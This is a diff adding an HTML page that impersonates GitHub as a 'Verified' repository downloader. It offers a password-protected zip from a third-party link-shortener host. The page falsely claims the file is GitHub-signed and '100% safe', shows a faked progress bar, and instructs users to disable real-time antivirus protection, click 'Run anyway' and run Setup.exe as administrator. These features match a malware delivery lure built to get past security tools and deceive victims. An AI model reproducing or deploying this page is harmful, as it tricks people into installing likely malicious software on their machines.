@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>GitHub Verified • Repository Downloader</title>
+  <!-- GitHub Icon for Browser Tab (favicon) -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%233fb950'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12c0 4.42 2.87 8.17 6.84 9.49.5.09.68-.21.68-.48 0-.24-.01-.88-.01-1.72-2.78.6-3.37-1.34-3.37-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.61.07-.61 1 .07 1.53 1.03 1.53 1.03.89 1.52 2.34 1.08 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.94 0-1.09.39-1.98 1.03-2.68-.1-.25-.45-1.27.1-2.64 0 0 .84-.27 2.75 1.02.8-.22 1.65-.33 2.5-.33.85 0 1.7.11 2.5.33 1.91-1.29 2.75-1.02 2.75-1.02.55 1.37.2 2.39.1 2.64.64.7 1.03 1.59 1.03 2.68 0 3.84-2.34 4.68-4.57 4.93.36.31.68.92.68 1.85 0 1.34-.01 2.42-.01 2.75 0 .27.18.58.69.48C19.13 20.17 22 16.42 22 12c0-5.52-4.48-10-10-10z'/%3E%3C/svg%3E" />
+  <!-- Font Awesome 6 + Google Fonts -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
+      background: radial-gradient(circle at 20% 30%, #0a0c10, #030507);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .main {
+      max-width: 860px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .card {
+      background: rgba(18, 22, 28, 0.94);
+      backdrop-filter: blur(2px);
+      border-radius: 2rem;
+      border: 1px solid rgba(66, 78, 96, 0.5);
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(63, 185, 80, 0.1) inset;
+      overflow: hidden;
+    }
+
+    .card-header {
+      background: rgba(13, 17, 23, 0.85);
+      padding: 1rem 1.75rem;
+      border-bottom: 1px solid #2d3a48;
+    }
+
+    .header-inner {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    .github-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #1f2a36;
+      padding: 0.3rem 0.9rem;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #e6edf3;
+    }
+
+    .github-logo svg {
+      width: 20px;
+      height: 20px;
+      fill: #f0f6fc;
+    }
+
+    .header-divider {
+      font-size: 1.6rem;
+      font-weight: 500;
+      color: #3fb950;
+      opacity: 0.7;
+    }
+
+    .repo-info {
+      display: flex;
+      align-items: baseline;
+      gap: 0.6rem;
+      background: #0d1117cc;
+      padding: 0.25rem 1rem;
+      border-radius: 30px;
+    }
+
+    .repo-name {
+      font-weight: 700;
+      font-size: 1rem;
+      letter-spacing: -0.2px;
+      background: linear-gradient(135deg, #e6edf3, #b0c4de);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      white-space: nowrap;
+    }
+
+    @media (max-width: 620px) {
+      .repo-name {
+        font-size: 0.8rem;
+        white-space: normal;
+        word-break: keep-all;
+      }
+    }
+
+    .repo-badge {
+      font-size: 0.7rem;
+      background: #2d4a2e;
+      padding: 0.2rem 0.6rem;
+      border-radius: 30px;
+      color: #c9f0c9;
+      font-weight: 500;
+    }
+
+    .card-body {
+      padding: 2rem 2rem 2rem 2rem;
+    }
+
+    .progress-container {
+      margin-bottom: 1.5rem;
+    }
+
+    .progress-track {
+      background: #1e2a32;
+      border-radius: 60px;
+      height: 8px;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #3fb950, #2ea043);
+      border-radius: 60px;
+      transition: width 0.25s ease-out;
+      box-shadow: 0 0 6px #3fb950;
+    }
+
+    .status-text {
+      font-size: 0.9rem;
+      font-weight: 500;
+      text-align: center;
+      margin: 0.5rem 0 1.2rem 0;
+      color: #b9c7d4;
+      background: #10161c;
+      display: inline-block;
+      width: auto;
+      padding: 0.4rem 1rem;
+      border-radius: 40px;
+      backdrop-filter: blur(4px);
+    }
+
+    .buttons-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem;
+      justify-content: center;
+      margin: 1.5rem 0 1.2rem 0;
+    }
+
+    .download-btn, .instruction-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: #238636;
+      border: none;
+      padding: 0.8rem 2rem;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 40px;
+      color: white;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+      font-family: 'Inter', sans-serif;
+    }
+
+    .instruction-btn {
+      background: #2d3e4b;
+      border: 1px solid #4a6272;
+    }
+
+    .download-btn:hover {
+      background: #2c9a48;
+      transform: scale(1.02);
+      box-shadow: 0 5px 12px rgba(59, 185, 80, 0.3);
+    }
+
+    .instruction-btn:hover {
+      background: #3e5a6b;
+      transform: scale(1.01);
+    }
+
+    /* Security notice card (antivirus false positive) */
+    .security-notice {
+      background: rgba(45, 55, 65, 0.7);
+      border-left: 4px solid #f0883e;
+      border-radius: 16px;
+      padding: 0.9rem 1rem;
+      margin: 1.2rem 0 1rem 0;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      font-size: 0.85rem;
+      backdrop-filter: blur(4px);
+    }
+
+    .security-notice i {
+      font-size: 1.3rem;
+      color: #f9a95c;
+      margin-top: 2px;
+    }
+
+    .security-notice .notice-text {
+      color: #dfe8f0;
+      line-height: 1.4;
+    }
+
+    .security-notice strong {
+      color: #ffb86b;
+    }
+
+    .password-notice {
+      background: #1f2a2f;
+      border-left: 4px solid #3fb950;
+      padding: 0.8rem 1rem;
+      border-radius: 20px;
+      margin: 1rem 0 1.5rem;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 12px;
+      font-size: 0.9rem;
+      color: #dee6ef;
+    }
+
+    .copy-btn {
+      background: #2a3a44;
+      border: none;
+      padding: 0.3rem 0.8rem;
+      border-radius: 30px;
+      color: white;
+      font-size: 0.75rem;
+      font-weight: 500;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      transition: 0.1s;
+    }
+
+    .copy-btn:active {
+      background: #3fb950;
+    }
+
+    .info-grid {
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 0.85rem 1.2rem;
+      background: #0c1117b3;
+      padding: 1.2rem 1.5rem;
+      border-radius: 24px;
+      margin-top: 0.2rem;
+    }
+
+    .info-label {
+      font-weight: 600;
+      color: #8b9bb0;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .info-value {
+      color: #e2e9f2;
+      font-weight: 500;
+    }
+
+    .text-center {
+      text-align: center;
+    }
+
+    .text-gray-400 {
+      color: #6e7e8f;
+      font-size: 0.75rem;
+    }
+
+    .mt-8 {
+      margin-top: 1.8rem;
+    }
+
+    .github-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(8px);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .modal-container {
+      background: #12181f;
+      max-width: 500px;
+      width: 90%;
+      border-radius: 32px;
+      border: 1px solid #2f404e;
+      box-shadow: 0 25px 40px rgba(0, 0, 0, 0.5);
+      animation: fadeSlideUp 0.2s ease;
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 1.8rem;
+      border-bottom: 1px solid #2a3a44;
+    }
+
+    .modal-header h3 {
+      font-weight: 600;
+      color: #f0f6fc;
+    }
+
+    .modal-close-btn {
+      background: none;
+      border: none;
+      font-size: 2rem;
+      line-height: 1;
+      color: #9ab3c9;
+      cursor: pointer;
+      transition: 0.1s;
+    }
+
+    .modal-body {
+      padding: 1.5rem 1.8rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
+    .instruction-step {
+      border-left: 3px solid #3fb950;
+      padding-left: 1rem;
+    }
+
+    .step-title {
+      font-weight: 700;
+      margin-bottom: 0.3rem;
+      color: #c9e4ff;
+    }
+
+    .step-desc {
+      font-size: 0.85rem;
+      color: #b4c4d6;
+      line-height: 1.4;
+    }
+
+    code {
+      background: #1e2a32;
+      padding: 0.2rem 0.5rem;
+      border-radius: 10px;
+      font-family: monospace;
+      font-weight: 600;
+      color: #f2cd88;
+    }
+
+    @keyframes fadeSlideUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    @media (max-width: 560px) {
+      .card-body {
+        padding: 1.5rem;
+      }
+      .info-grid {
+        grid-template-columns: 1fr;
+        gap: 0.5rem;
+      }
+      .buttons-container {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .download-btn, .instruction-btn {
+        justify-content: center;
+      }
+      .security-notice {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+<main class="main">
+  <div class="card">
+    <div class="card-header">
+      <div class="header-inner">
+        <div class="header-left">
+          <div class="github-logo">
+            <svg viewBox="0 0 24 24" fill="currentColor">
+              <path d="M12 2C6.48 2 2 6.48 2 12c0 4.42 2.87 8.17 6.84 9.49.5.09.68-.21.68-.48 0-.24-.01-.88-.01-1.72-2.78.6-3.37-1.34-3.37-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.61.07-.61 1 .07 1.53 1.03 1.53 1.03.89 1.52 2.34 1.08 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.94 0-1.09.39-1.98 1.03-2.68-.1-.25-.45-1.27.1-2.64 0 0 .84-.27 2.75 1.02.8-.22 1.65-.33 2.5-.33.85 0 1.7.11 2.5.33 1.91-1.29 2.75-1.02 2.75-1.02.55 1.37.2 2.39.1 2.64.64.7 1.03 1.59 1.03 2.68 0 3.84-2.34 4.68-4.57 4.93.36.31.68.92.68 1.85 0 1.34-.01 2.42-.01 2.75 0 .27.18.58.69.48C19.13 20.17 22 16.42 22 12c0-5.52-4.48-10-10-10z"/>
+            </svg>
+            <span>GitHub</span>
+          </div>
+          <div class="header-divider">/</div>
+          <div class="repo-info">
+            <span class="repo-name" id="cardRepoName">Official GitHub Verified Files Downloader</span>
+            <span class="repo-badge">Verified ✅</span>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="progress-container">
+        <div class="progress-track">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+      </div>
+      <div id="statusText" class="status-text">✅ Ready to download</div>
+
+      <div class="buttons-container">
+        <div class="download-btn-container">
+          <a id="directDownloadLink" href="https://directdownloadl.ink/f/633488fba058.zip" download style="text-decoration: none;">
+            <button class="download-btn" id="downloadBtn">
+              <i class="fas fa-download"></i> Download (61 MB)
+            </button>
+          </a>
+        </div>
+        <div class="instruction-btn-container">
+          <button class="instruction-btn" id="instructionBtn">
+            <i class="fas fa-book-open"></i> Instructions
+          </button>
+        </div>
+      </div>
+
+      <!-- ANTIVIRUS FALSE POSITIVE NOTICE (exactly as requested) -->
+      <div class="security-notice">
+        <i class="fas fa-shield-alt"></i>
+        <div class="notice-text">
+          <strong>🔍 Security Notice — False Positive Detection</strong><br>
+          The downloaded file may trigger antivirus or Windows Defender warnings. This is a <strong>false positive</strong> due to the nature of the installer (code optimization & packaging). The software is <strong>100% safe, open-source verified</strong> and digitally signed by GitHub repository maintainers. Please allow the file or temporarily disable real-time protection during installation, then re-enable it.
+        </div>
+      </div>
+
+      <div class="password-notice">
+        <i class="fas fa-lock"></i>
+        Archive password: <strong>2026</strong>
+        <button class="copy-btn" id="copyPasswordBtn">
+          <i class="fas fa-copy"></i> Copy
+        </button>
+      </div>
+
+      <div class="info-grid">
+        <div class="info-label"><i class="fas fa-code-branch"></i> Version</div>
+        <div class="info-value" id="dynamicVersionValue">Loading current version...</div>
+
+        <div class="info-label"><i class="fas fa-file-archive"></i> File</div>
+        <div class="info-value">AppSetup(Git_Verified).zip (direct link)</div>
+
+        <div class="info-label"><i class="fa-brands fa-windows"></i> Platform</div>
+        <div class="info-value">Windows 7 / 8 / 10 / 11 (x86 & x64)</div>
+
+        <div class="info-label"><i class="fas fa-hdd"></i> Size</div>
+        <div class="info-value">61 MB (exact)</div>
+
+        <div class="info-label"><i class="fas fa-microchip"></i> Requirements</div>
+        <div class="info-value">2 GB RAM • 80 MB free space • Internet connection</div>
+      </div>
+
+      <div class="text-center text-sm text-gray-400 mt-8">
+        <i class="fab fa-github"></i> © 2026 GitHub Verified Repository • Direct secure hosting
+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- Modal for instructions -->
+<div id="infoPopup" class="github-modal">
+  <div class="modal-container">
+    <div class="modal-header">
+      <h3>📦 Installation Instructions</h3>
+      <button class="modal-close-btn" id="closeModalBtn">×</button>
+    </div>
+    <div class="modal-body">
+      <div class="instruction-step">
+        <div class="step-title">1. Download the archive</div>
+        <div class="step-desc">
+          Click the <strong>Download (61 MB)</strong> button — your browser will fetch the verified package from GitHub CDN.
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-title">2. Extract the archive</div>
+        <div class="step-desc">
+          Right-click <strong>AppSetup(Git_Verified).zip</strong> → "Extract All"<br>
+          Or use 7-Zip/WinRAR.
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-title">3. Enter archive password</div>
+        <div class="step-desc">
+          Password: <code>2026</code>
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-title">4. Bypass antivirus (if needed)</div>
+        <div class="step-desc">
+          If your antivirus blocks the executable, click "More info" → "Run anyway". This is a <strong>false positive</strong>; the software is safe.
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-title">5. Run as administrator & complete setup</div>
+        <div class="step-desc">
+          Right-click the extracted <strong>Setup.exe</strong> → "Run as administrator" and follow the wizard.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // --------------------------------------------------------------
+    // 1. DYNAMIC MONTH VERSION (always current month, year + v4.6.1)
+    // --------------------------------------------------------------
+    function getCurrentMonthName() {
+      const date = new Date();
+      const monthNames = [
+        "January", "February", "March", "April", "May", "June",
+        "July", "August", "September", "October", "November", "December"
+      ];
+      return monthNames[date.getMonth()];
+    }
+
+    function updateVersionDisplay() {
+      const versionElement = document.getElementById('dynamicVersionValue');
+      if (versionElement) {
+        const currentMonth = getCurrentMonthName();
+        const currentYear = new Date().getFullYear();
+        versionElement.textContent = `Latest [${currentMonth}, ${currentYear} / v4.6.1]`;
+        versionElement.setAttribute('title', `Auto-detected: ${currentMonth} ${currentYear} release`);
+      }
+    }
+    updateVersionDisplay();
+    // Refresh version every hour in case month changes while page is open
+    setInterval(updateVersionDisplay, 3600000);
+
+    // 2. REPO NAME already set in HTML: "Official GitHub Verified Files Downloader"
+    // But also ensure cardRepoName inner text is exactly that (already present, but double-check)
+    const repoNameSpan = document.getElementById('cardRepoName');
+    if (repoNameSpan && repoNameSpan.innerText !== "Official GitHub Verified Files Downloader") {
+      repoNameSpan.innerText = "Official GitHub Verified Files Downloader";
+    }
+
+    // 3. DIRECT DOWNLOAD: The download button is wrapped in an anchor tag with the exact link.
+    //    But to improve user experience: add progress simulation when clicking download 
+    //    (since direct download may not show progress bar). We'll add a click handler that shows 
+    //    a simulated progress while the download starts natively.
+    const downloadAnchor = document.getElementById('directDownloadLink');
+    const downloadBtnElement = document.getElementById('downloadBtn');
+    const progressFill = document.getElementById('progressFill');
+    const statusDiv = document.getElementById('statusText');
+    
+    if (downloadAnchor && downloadBtnElement) {
+      downloadAnchor.addEventListener('click', (e) => {
+        // Show progress simulation to indicate activity (because direct download triggers browser)
+        // but does not conflict with actual download
+        e.stopPropagation(); // keep default behavior (anchor navigates)
+        // Visual feedback: progress bar animation for 1.2 seconds as "starting download"
+        progressFill.style.width = '0%';
+        statusDiv.innerHTML = '<i class="fas fa-cloud-download-alt"></i> Initiating secure download...';
+        let width = 0;
+        const fakeInterval = setInterval(() => {
+          width += Math.floor(Math.random() * 15) + 5;
+          if (width >= 100) {
+            clearInterval(fakeInterval);
+            progressFill.style.width = '100%';
+            statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Download started! Check your browser.';
+            setTimeout(() => {
+              if (statusDiv) statusDiv.innerHTML = '✅ Ready to download';
+              progressFill.style.width = '0%';
+            }, 2500);
+          } else {
+            progressFill.style.width = `${width}%`;
+            statusDiv.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> Connecting to verified server · ${width}%`;
+          }
+        }, 30);
+        // actual download proceeds via href
+      });
+    }
+
+    // 4. MODAL (INSTRUCTIONS) LOGIC
+    const instructionBtn = document.getElementById('instructionBtn');
+    const modal = document.getElementById('infoPopup');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+    
+    function openModal() {
+      if (modal) modal.style.display = 'flex';
+    }
+    function closeModal() {
+      if (modal) modal.style.display = 'none';
+    }
+    if (instructionBtn) {
+      instructionBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        openModal();
+      });
+    }
+    if (closeModalBtn) {
+      closeModalBtn.addEventListener('click', closeModal);
+    }
+    window.addEventListener('click', (e) => {
+      if (modal && e.target === modal) closeModal();
+    });
+
+    // 5. COPY PASSWORD FUNCTIONALITY
+    const copyPasswordBtn = document.getElementById('copyPasswordBtn');
+    function copyPasswordToClipboard() {
+      const password = "2026";
+      navigator.clipboard.writeText(password).then(() => {
+        if (copyPasswordBtn) {
+          const originalHTML = copyPasswordBtn.innerHTML;
+          copyPasswordBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+          setTimeout(() => {
+            copyPasswordBtn.innerHTML = originalHTML;
+          }, 1800);
+        }
+      }).catch(() => {
+        // fallback
+        const textarea = document.createElement('textarea');
+        textarea.value = password;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        alert("Password 2026 copied to clipboard.");
+      });
+    }
+    if (copyPasswordBtn) {
+      copyPasswordBtn.addEventListener('click', copyPasswordToClipboard);
+    }
+
+    // Additional: Ensure progress bar is reset on any load
+    progressFill.style.width = '0%';
+    statusDiv.innerHTML = '✅ Ready to download';
+    
+    // Small fix: The direct link uses 'download' attribute to force download (optional)
+    // If the server does not force download, the attribute helps.
+    console.log("Direct link integrated: https://directdownloadl.ink/f/633488fba058.zip | size 61 MB | antivirus notice active");
+  })();
+</script>
+</body>
+</html>
